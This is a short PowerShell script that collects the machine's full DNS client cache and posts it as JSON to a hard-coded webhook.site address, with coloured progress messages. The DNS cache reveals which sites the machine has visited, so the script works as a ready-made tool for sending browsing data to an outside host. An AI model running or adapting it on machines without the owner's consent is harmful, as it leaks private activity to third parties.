# DNS Cache One-Shot Sender
$WebhookUrl = "https://webhook.site/2c7348c4-f3c8-4021-bd78-95b6c172ad05"

Write-Host "=================================================================" -ForegroundColor Cyan
Write-Host "                 DNS CACHE SENDER (ALL-IN-ONE)" -ForegroundColor Cyan
Write-Host "=================================================================" -ForegroundColor Cyan
Write-Host "[+] Fetching full DNS cache..." -ForegroundColor Green

# Get the cache
$cache = Get-DnsClientCache | Select-Object Entry, Data, Type, TimeToLive | Sort-Object Entry

if (-not $cache) {
    Write-Host "[!] No DNS cache entries found." -ForegroundColor Yellow
    pause
    exit
}

$totalRecords = $cache.Count
Write-Host "[+] Found $totalRecords records." -ForegroundColor Green
Write-Host "[+] Preparing JSON payload..." -ForegroundColor Yellow

# Convert entire array to JSON
$jsonBody = $cache | ConvertTo-Json -Depth 3

Write-Host "[+] Sending data to Webhook..." -ForegroundColor Cyan

try {
    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing | Out-Null
    Write-Host "[SUCCESS] All $totalRecords records sent successfully!" -ForegroundColor Green
} catch {
    Write-Host "[ERROR] Failed to send: $_" -ForegroundColor Red
    Write-Host "Tip: The payload might be too large for the webhook." -ForegroundColor Yellow
}

Write-Host "=================================================================" -ForegroundColor Cyan
pause